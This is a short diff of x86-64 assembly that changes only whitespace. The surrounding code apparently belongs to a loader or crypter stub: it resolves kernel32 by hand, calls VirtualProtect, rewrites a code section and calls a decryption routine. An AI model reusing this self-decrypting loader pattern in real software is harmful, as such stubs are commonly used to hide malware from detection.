@@ -370,7 +370,7 @@ WinMain:
         mov [TamArqTarget], rax
 		xor r10,r10
 		call Locate_kernel32
-		
+
 		call VirtualProect
 		;CALL VirtualProtect 
 		mov r10, [TamArqTarget]
@@ -385,7 +385,6 @@ WinMain:
 		call rsi
 		add rsp, 0x30
 		
-		
 		mov ecx, 0
 		mov rax, CodeRed
 		mov rdx,[TamArqTarget]
@@ -399,8 +398,9 @@ WinMain:
 			
 			dec rdx
 			cmp rcx,rdx
-			jne WriteSecion        
-			call decCode
+			jne WriteSecion 
+
+	call decCode
 ret
 ;***************
 ;*     AND     *
